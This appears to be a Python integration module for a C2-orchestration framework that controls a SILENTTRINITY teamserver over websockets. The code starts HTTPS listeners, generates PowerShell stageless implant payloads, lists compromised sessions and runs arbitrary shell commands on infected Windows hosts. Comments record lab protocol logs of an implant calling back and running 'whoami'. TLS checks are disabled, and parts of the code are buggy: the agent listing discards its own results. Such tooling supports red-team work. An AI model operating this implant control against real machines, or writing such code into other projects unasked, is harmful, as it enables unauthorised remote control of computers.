from .. import ResourceExistsError, ResourceNotFoundError
from .. import C2, ListenerType, LauncherType, AgentType, Options, OptionDesc
from ....dtos import AgentDto, CreateListenerDto, RequestDto, ResponseDto, ShellExecuteDto, DownloadFileDto, UploadFileDto
from ....dtos import CreateLauncherDto

import asyncio
import random
import string
from typing import Optional, Dict
import logging
import json

logger = logging.getLogger(__name__)

import hmac
from hashlib import sha512
from base64 import b64encode
# from websockets import Headers
# coding: utf-8
from asgiref.sync import async_to_sync
from asgiref.sync import sync_to_async

from base64 import b64encode
import websockets
from websockets import Headers
import hmac
from hashlib import sha512
import ssl
from urllib.parse import urlparse
import logging
# import signal 
# signal.signal(signal.SIGINT, self.exit_gracefully)
# signal.signal(signal.SIGTERM, self.exit_gracefully)

logger = logging.getLogger(__name__)


def gen_random_string(length: int = 10):
    return ''.join([random.choice(string.ascii_letters + string.digits) for n in range(length)])

from functools import cache

class ConnectionHandler():

    def generate_auth_header(self, username, password):
        client_digest = hmac.new(password.encode(), msg=b'silenttrinity', digestmod=sha512).hexdigest()
        header_value = b64encode(f"{username}:{client_digest}".encode()).decode()
        return Headers({'Authorization': header_value})

    @cache
    def __init__(self, username,password,teamserver_url):
        # head = await sync_to_async(self.generate_auth_header)(username, password)
        self.head = self.generate_auth_header(username, password)
        logger.debug("head : %r", self.head)

        self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE

        URL = urlparse(teamserver_url)
        self.url = f"{URL.scheme}://{URL.hostname}:{URL.port}"

    async def connect(self):
        self.ws = await websockets.connect(
            self.url, 
            extra_headers=self.head, 
            ssl=self.ssl_context, 
            ping_interval=None,
            ping_timeout=None
        )
        logger.error('self.ws: %r', self.ws)
        await  self.ws.recv()
        return True
        # async with websockets.connect(
        #     url, 
        #     extra_headers=head, 
        #     ssl=ssl_context, 
        #     ping_interval=None, # We disable the built-in ping/heartbeat mechanism and use our own
        #     ping_timeout=None
        # ) as ws:

        #     logger.error(f'Connected to {url}')
        #     self.ws = ws
        #     self.msg_queue =  asyncio.Queue(maxsize=1)
        #     asyncio.gather(self.data_handler)

    async def send(self, payload):
        if not hasattr(self, 'ws'):
            await self.connect()
        logger.error('[*]-> send: %r', payload)
        await self.ws.send(json.dumps(payload))

    async def recv(self):
        response = await self.ws.recv()
        logger.error('[*]<- resposne:%r',response)
        return json.loads(response)

    async def close_connection(self):
        if  hasattr(self, 'ws'):
            self.ws.close()



class SilentTriC2(C2):
    name = 'Silent Trinity'
    description = 'Base integration of st_client'
    documentation = 'https://github.com/byt3bl33d3r/SILENTTRINITY'
    registered_options = [
        OptionDesc(
            name='teamserver_url',
            description='Url of the corresponding API',
            example='wss://127.0.0.1:8000',
            field_type='string',
            required=True
        ),
        OptionDesc(
            name='username',
            description='user owner of the API',
            example='silenttri',
            field_type='string',
            required=True
        ),
        OptionDesc(
            name='password',
            description='Url of the corresponding teamserver',
            example='p4ssw0rd',
            field_type='protected-string',
            required=True
        ),
    ]

    def __init__(self, options, *args, **kwargs) -> None:
        super().__init__(options, *args, **kwargs)
        self._listener_types = {
            SilentTriHTTPListenerType.name: SilentTriHTTPListenerType(
                self.options['teamserver_url'],
                self
            ),
        }
        self._launcher_types = {
            SilentTriPowershellLauncherType.name: SilentTriPowershellLauncherType(self.options['teamserver_url'], self),
        }

        self._agent_types = {
            'powershell': PowershellAgentType(self.options['teamserver_url'], self),
        }

        username = options.get('username')
        password = options.get('password')
        teamserver_url = options.get('teamserver_url')
        self.connection = ConnectionHandler(
            username,
            password,
            teamserver_url
            )

        # try:
        #     self.ws = async_to_sync(websockets.connect)(
        #         url, 
        #         extra_headers=head, 
        #         ssl=ssl_context, 
        #         ping_interval=None,
        #         ping_timeout=None
        #     )
        # except Exception as e:
        #     logger.error(repr(e),stack_info=True)
        #     self.ws = None


    async def is_alive(self, requestDto: RequestDto) -> ResponseDto:
        """
            tries to connect to the corresponding c2 and returns ResponseDto with successful_transaction in case fo success
            raises ConectionError in case of not be able to connect to c2 instance
            raises ConnectionRefusedError in case of not be able to authenticate
        """
        

        if await self.connection.connect():
            return ResponseDto(successful_transaction=True)
        else:
            return ResponseDto(successful_transaction=False)


    def exit_gracefully(self, *args):
        if hasattr(self, 'ws'):
            self.ws.close()

    async def retrieve_agents(self, dto: RequestDto) -> ResponseDto:
        """
            retrives all available Agents on the  given C2
               raises ValueError in case of invalid dto
               raises ConectionError in case of not be able to connect to c2 instance
        """
        # ---> {"id": "eqWKq4m74d", "ctx": "sessions", "cmd": "get_selected", "args": {}, "data": {}}
        # <--- {"type": "message", "id": "eqWKq4m74d", "ctx": "sessions", "name": "get_selected", "status": "error", "result": "Command 'get_selected' does not exist in context 'sessions'"}

        # ---> {"id": "i8Qz3wVLUt", "ctx": "sessions", "cmd": "list", "args": {}, "data": {}}
        # <--- {"type": "message", "id": "i8Qz3wVLUt", "ctx": "sessions", "name": "list", "status": "success", "result": {"b0c71f5e-660b-4f93-b722-9df523b4b063": {"guid": "b0c71f5e-660b-4f93-b722-9df523b4b063", "alias": "b0c71f5e-660b-4f93-b722-9df523b4b063", "address": "192.168.0.117", "info": {"OsReleaseId": "2009", "Jobs": 1, "Sleep": 5000, "Guid": "b0c71f5e-660b-4f93-b722-9df523b4b063", "ProcessId": 7236, "Os": "Microsoft Windows 10 Home 10.0.19043.0", "DotNetVersion": "4.0.30319.42000", "Hostname": "DESKTOP-2LD29PJ", "MinJitter": 0, "HighIntegrity": false, "Debug": true, "MaxJitter": 0, "ProcessName": "powershell", "NetworkAddresses": ["192.168.0.117", "169.254.51.246"], "Domain": "DESKTOP-2LD29PJ", "OsArch": "x64", "Username": "criso", "C2Channels": ["https"], "CallBackUrls": [["https://192.168.0.173:8899"]]}, "lastcheckin": 2.287958860397339}}}

        set_ctx = {"id": gen_random_string(), "ctx": "sessions", "cmd": "get_selected", "args": {}, "data": {}}
        await self.connection.send(set_ctx)
        await self.connection.recv()
        cmd_list = {"id": gen_random_string(), "ctx": "sessions", "cmd": "list", "args": {}, "data": {}} 
        await self.connection.send(cmd_list)
        response = await self.connection.recv()
        agents = response['results']
        agents = []
        for agent_id in agents:
            _agent = AgentDto(
                internal_id=agent_id,
                hostname=agents['agent']['info']['Hostname'],
                active=True,
                listener_internal_id=1,
                agent_shell_type='powershell',
                username=''
            )
            agents.append(_agent)
        dto = ResponseDto(
            successful_transaction=True,
            agents=agents,
        )
        return dto

class SilentTriHTTPListenerType(ListenerType):
    name = 'https-profile'
    description = 'standard http listener, messages are delivered in enconded comment'
    registered_options = [
        OptionDesc(
            name='bindPort',
            description='port to which the agent is going to try to connect',
            example=80,
            field_type='integer',
            required=True
        ),
        OptionDesc(
            name='bindIp',
            description='interfaces to which the listener is bind',
            example='0.0.0.0',
            field_type='string',
            required=False
        ),
    ]

    def __init__(self, url: str, _c2: SilentTriC2) -> None:
        self._url = url
        self._c2 = _c2

    async def create_listener(self, options: Options, dto: RequestDto) -> Dict:
        _bindPort = options.get('bindPort', 8080)
        _bindIp = options.get('bindIp','0.0.0.0')
        connection = self._c2.connection
        set_listeners = {"id": gen_random_string(), "ctx": "listeners", "cmd": "get_selected", "args": {}, "data": {}}
        await connection.send(set_listeners)
        await connection.recv()

        set_https = {"id": gen_random_string(), "ctx": "listeners", "cmd": "use", "args": {"name": "https"}, "data": {}}
        await connection.send(set_https)
        await connection.recv()

        set_port = {"id": gen_random_string(), "ctx": "listeners", "cmd": "set", "args": {"name": "Port", "value": str(_bindPort)}, "data": {}}
        await connection.send(set_port)
        await connection.recv()

        set_iface = {"id": gen_random_string(), "ctx": "listeners", "cmd": "set", "args": {"name": "BindIP", "value": _bindIp}, "data": {}}
        await connection.send(set_iface)
        await connection.recv()

        set_start = {"id": gen_random_string(), "ctx": "listeners", "cmd": "start", "args": {}, "data": {}}

        # ---> {"id": "PqFOfFolzu", "ctx": "listeners", "cmd": "start", "args": {}, "data": {}}
        # <--- {"type": "message", "id": "PqFOfFolzu", "ctx": "listeners", "name": "start", "status": "success", "result": {"name": "https", "author": "@byt3bl33d3r", "description": "HTTPS listener", "running": true, "options": {"Name": {"Description": "Name for the listener.", "Required": true, "Value": "https"}, "BindIP": {"Description": "The IPv4/IPv6 address to bind to.", "Required": true, "Value": "127.0.0.1"}, "Port": {"Description": "Port for the listener.", "Required": true, "Value": "4455"}, "Cert": {"Description": "SSL Certificate file", "Required": false, "Value": "~/.st/cert.pem"}, "Key": {"Description": "SSL Key file", "Required": false, "Value": "~/.st/key.pem"}, "RegenCert": {"Description": "Regenerate TLS cert", "Required": false, "Value": false}, "CallBackURls": {"Description": "Additional C2 Callback URLs (comma seperated)", "Required": false, "Value": ""}, "Comms": {"Description": "C2 Comms to use", "Required": true, "Value": "https"}}}}
        # <--- {"type": "event", "name": "STATS_UPDATE", "data": {"listeners": {"https": {"name": "https", "author": "@byt3bl33d3r", "description": "HTTPS listener", "running": true, "options": {"Name": {"Description": "Name for the listener.", "Required": true, "Value": "https"}, "BindIP": {"Description": "The IPv4/IPv6 address to bind to.", "Required": true, "Value": "127.0.0.1"}, "Port": {"Description": "Port for the listener.", "Required": true, "Value": "4455"}, "Cert": {"Description": "SSL Certificate file", "Required": false, "Value": "~/.st/cert.pem"}, "Key": {"Description": "SSL Key file", "Required": false, "Value": "~/.st/key.pem"}, "RegenCert": {"Description": "Regenerate TLS cert", "Required": false, "Value": false}, "CallBackURls": {"Description": "Additional C2 Callback URLs (comma seperated)", "Required": false, "Value": ""}, "Comms": {"Description": "C2 Comms to use", "Required": true, "Value": "https"}}}}, "sessions": {"b0c71f5e-660b-4f93-b722-9df523b4b063": {"guid": "b0c71f5e-660b-4f93-b722-9df523b4b063", "alias": "b0c71f5e-660b-4f93-b722-9df523b4b063", "address": "192.168.0.117", "info": {"OsReleaseId": "2009", "Jobs": 1, "Sleep": 5000, "Guid": "b0c71f5e-660b-4f93-b722-9df523b4b063", "ProcessId": 7236, "Os": "Microsoft Windows 10 Home 10.0.19043.0", "DotNetVersion": "4.0.30319.42000", "Hostname": "DESKTOP-2LD29PJ", "MinJitter": 0, "HighIntegrity": false, "Debug": true, "MaxJitter": 0, "ProcessName": "powershell", "NetworkAddresses": ["192.168.0.117", "169.254.51.246"], "Domain": "DESKTOP-2LD29PJ", "OsArch": "x64", "Username": "criso", "C2Channels": ["https"], "CallBackUrls": [["https://192.168.0.173:8899"]]}, "lastcheckin": 23195.3134829998}}, "modules": {"loaded": 78}, "stagers": {"loaded": 9}, "users": {"pucara": {"name": "pucara", "ip": "127.0.0.1", "port": 46398}}, "ips": ["192.168.0.173"]}}

        await connection.send(set_start)
        # await ws.send(json.dumps(set_start))
        # logger.error('response1: %r',response1)

        # response = await  connection.recv()
        # logger.error('-->response: %r',response)
        await  connection.recv()

        # logger.error('response2: %r',response2)

        response = await  connection.recv()
        logger.error('response: %r',response)

        result = response.get('result')

        logger.error('result: %r',result)
        listener = CreateListenerDto(
            listener_internal_id=result['name'],
            listener_options=options
            )
        dto = ResponseDto(
            successful_transaction=True,
            created_listener=listener
        )
        return dto

    async def delete_listener(
        self,
        internal_id: str,
        options: Options,
        dto: RequestDto
    ) -> None:
        # Review
        listener_internal_id = RequestDto.listener.listener_internal_id
        connection = self._c2.connection

        set_listeners = {"id": gen_random_string(), "ctx": "listeners", "cmd": "get_selected", "args": {}, "data": {}}
        await connection.send(set_listeners)
        await connection.recv()

        stop_listener = {"id": gen_random_string(), "ctx": "listeners", "cmd": "stop", "args": {"name": listener_internal_id}, "data": {}}
        await connection.send(stop_listener)

        # logger.error('-->response: %r',response)

        response = await  connection.recv()
        logger.error('response: %r',response)

        # result = response.get('result')

        dto = ResponseDto(
            successful_transaction=True,

        )
        return dto


class SilentTriPowershellLauncherType(LauncherType):
    name = 'Powershell Launcher'
    description = 'Uses powershell.exe to launch Agent using [systemm.reflection.assemly::load()'
    registered_options = [
        # OptionDesc(
        #     name='Delay',
        #     description='Amount of time that Agent will take the agent to contact the listener in seconds',
        #     example='5',
        #     field_type='integer',
        #     required=True
        # ),
    ]

    def __init__(self, url: str,  _c2: SilentTriC2) -> None:
        self._url = url
        self._c2 = _c2
    
    async def create_and_retrieve_launcher(self, options: Options, dto: RequestDto):
        """
        creates and retrieves laucnher on the corresponding C2 
           raises ValueError in case of invalid dto
           raises ConectionError in case of not be able to connect to c2 instance
        """
        # ---> {"id": "xOUvWeyOk3", "ctx": "stagers", "cmd": "get_selected", "args": {}, "data": {}}
        # <--- {"type": "message", "id": "xOUvWeyOk3", "ctx": "stagers", "name": "get_selected", "status": "success", "result": {"name": "wmic", "description": "Stage via wmic XSL execution", "author": "@byt3bl33d3r", "options": {}}}

        # ---> {"id": "d3rTRvnuhT", "ctx": "listeners", "cmd": "set", "args": {"name": "Name", "value": "test"}, "data": {}}

        # ---> {"id": "GSdJMyul3K", "ctx": "stagers", "cmd": "use", "args": {"name": "powershell_stageless"}, "data": {}}
        # <--- {"type": "message", "id": "GSdJMyul3K", "ctx": "stagers", "name": "use", "status": "success", "result": {"name": "powershell_stageless", "description": "Embeds the BooLang Compiler within PowerShell and directly executes STs stager", "author": "@byt3bl33d3r", "options": {"AsFunction": {"Description": "Generate stager as a PowerShell function", "Required": false, "Value": true}}}}

        # ---> {"id": "4hM4EksY4b", "ctx": "stagers", "cmd": "generate", "args": {"listener_name": "https"}, "data": {}}                                                                                             
        # <--- {"type": "message", "id": "4hM4EksY4b", "ctx": "stagers", "name": "generate", "status": "success", "result": {"output": "function Invoke-L..... ", "suggestions": "", "extension": "ps1"}}

        connection = self._c2.connection

        set_ctx = {"id": gen_random_string(), "ctx": "stagers", "cmd": "get_selected", "args": {}, "data": {}}
        await connection.send(set_ctx)
        await connection.recv()

        set_powershell_stagless = {"id": gen_random_string(), "ctx": "stagers", "cmd": "use", "args": {"name": "powershell_stageless"}, "data": {}}
        await connection.send(set_powershell_stagless)
        await connection.recv()

        # logger.error('RequestDto.listener: %r ', RequestDto)
        listener_name = dto.listener.listener_internal_id
        set_generate = {"id": gen_random_string(), "ctx": "stagers", "cmd": "generate", "args": {"listener_name": listener_name}, "data": {}}
        await connection.send(set_generate)
        response = await connection.recv()
        # await ws.send(json.dumps(set_generate))
        # response = await recv_(ws)
        result = response.get('result')

        launcher = CreateLauncherDto(
            payload_content=result['output'],
            payload_name='st_stageless.' + result['extension']
            )
        dto = ResponseDto(
            successful_transaction=True,
            created_launcher=launcher
        )
        return dto

class PowershellAgentType(AgentType):
    agent_shell_type = 'powershell'

    def __init__(self, url: str, _c2: SilentTriC2) -> None:
        self._url = url
        self._c2 = _c2

    async def shell_execute(self, command: str, shell_dto: ShellExecuteDto, dto: RequestDto) -> bytes:
        """
        executes a command string on the target's machine
           raises ValueError in case of invalid dto
           raises ConectionError in case of not be able to connect to c2 instance
           raises ResourceNotFoundError
        """
        # ---> {"id": "Qv9BdutEJ0", "ctx": "modules", "cmd": "use", "args": {"name": "boo/shell"}, "data": {}}
        # <--- {"type": "message", "id": "Qv9BdutEJ0", "ctx": "modules", "name": "use", "status": "success", "result": {"name": "boo/shell", "language": "boo", "description": "Runs a shell command", "author": "@byt3bl33d3r", "references": [], "options": {"Command": {"Description": "The ShellCommand to execute, including any arguments", "Required": true, "Value": ""}, "Path": {"Description": "The Path of the directory from which to execute the ShellCommand", "Required": false, "Value": "C:\\WINDOWS\\System32"}, "Username": {"Description": "Optional alternative username to execute ShellCommand as", "Required": false, "Value": ""}, "Domain": {"Description": "Optional alternative Domain of the username to execute ShellCommand as", "Required": false, "Value": ""}, "Password": {"Description": "Optional password to authenticate the username to execute the ShellCommand as", "Required": false, "Value": ""}}}}

        # ---> {"id": "kTZN3U1Xtz", "ctx": "modules", "cmd": "set", "args": {"name": "command", "value": "whoami"}, "data": {}}
        # <--- {"type": "message", "id": "kTZN3U1Xtz", "ctx": "modules", "name": "set", "status": "success", "result": null}   

        # ---> {"id": "tfwCJrSKZf", "ctx": "modules", "cmd": "run", "args": {"guids": ["b0c71f5e-660b-4f93-b722-9df523b4b063"]}, "data": {}}
        # <--- {"type": "message", "id": "tfwCJrSKZf", "ctx": "modules", "name": "run", "status": "success", "result": null}
        # <--- {"type": "event", "name": "JOB_RESULT", "data": {"id": "Aw8lrj6luD", "output": "[*] Path: C:\\WINDOWS\\System32 Command: whoami Args: \r\ndesktop-2ld29pj\\criso\r\n\r\n", "session": "b0c71f5e-660b-4f93-b722-9df523b4b063", "address": "192.168.0.117"}}
        # [*] [TS-UM5UF] b0c71f5e-660b-4f93-b722-9df523b4b063 returned job result (id: Aw8lrj6luD)
        # [*] Path: C:\WINDOWS\System32 Command: whoami Args: 
        # desktop-2ld29pj\criso

        connection = self._c2.connection

        set_ctx = {"id": gen_random_string(), "ctx": "modules", "cmd": "use", "args": {"name": "boo/shell"}, "data": {}}
        await connection.send(set_ctx)
        await connection.recv()
        # await ws.send(json.dumps(set_ctx))
        # await recv_(ws)
        
        set_cmd = {"id": gen_random_string(), "ctx": "modules", "cmd": "set", "args": {"name": "command", "value": command}, "data": {}}
        await connection.send(set_cmd)
        await connection.recv()
        # await ws.send(json.dumps(set_ctx))
        # await recv_(ws)

        set_run = {"id": gen_random_string(), "ctx": "modules", "cmd": "run", "args": {"guids": [shell_dto.agent_internal_id]}, "data": {}}
        await connection.send(set_run)
        response = await connection.recv()
        # await ws.send(json.dumps(set_ctx))
        # response = await recv_(ws)
        result = response['result']
        response_dto = {'content': result['output']}
        return response_dto

    async def download_file(self, download_dto: DownloadFileDto, dto: RequestDto) -> bytes:
        """
        downloads the required file from the target's machine
           raises ValueError in case of invalid dto
           raises ConectionError in case of not be able to connect to c2 instance
           raises ResourceNotFoundError 

        """
        raise NotImplementedError

    async def upload_file(self, upload_dto: UploadFileDto, dto: RequestDto) -> bytes:
        """
        uploads the provided file to the target's machine
           raises ValueError in case of invalid dto
           raises ConectionError in case of not be able to connect to c2 instance
           raises ResourceNotFoundError 

        """
        raise NotImplementedError
